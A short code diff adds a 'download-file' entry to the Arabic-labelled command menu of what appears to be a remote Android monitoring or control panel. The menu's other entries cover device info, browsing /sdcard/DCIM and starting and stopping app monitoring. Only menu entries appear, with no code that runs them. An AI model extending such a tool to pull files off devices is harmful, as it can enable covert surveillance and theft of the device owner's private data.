@@ -245,6 +245,7 @@ COMMANDS = {
     # info
     "get-device-info": {"category": "info", "label": "📋 معلومات الجهاز",  "description": "معلومات تفصيلية",     "needs_param": False},
     "ls":              {"category": "info", "label": "📂 مستعرض الملفات",  "description": "عرض ملفات في مسار",  "needs_param": True, "param_hint": "/sdcard/DCIM"},
+    "download-file":   {"category": "info", "label": "📥 تحميل ملف",      "description": "تحميل ملف من الجهاز", "needs_param": True, "param_hint": "/sdcard/file.txt"},
     # app_monitoring
     "app-monitor-start":  {"category": "app_monitoring", "label": "🟢 تفعيل المراقبة", "description": "بدء مراقبة التطبيقات",     "needs_param": False},
     "app-monitor-stop":   {"category": "app_monitoring", "label": "🔴 إيقاف المراقبة", "description": "إيقاف مراقبة التطبيقات",   "needs_param": False},
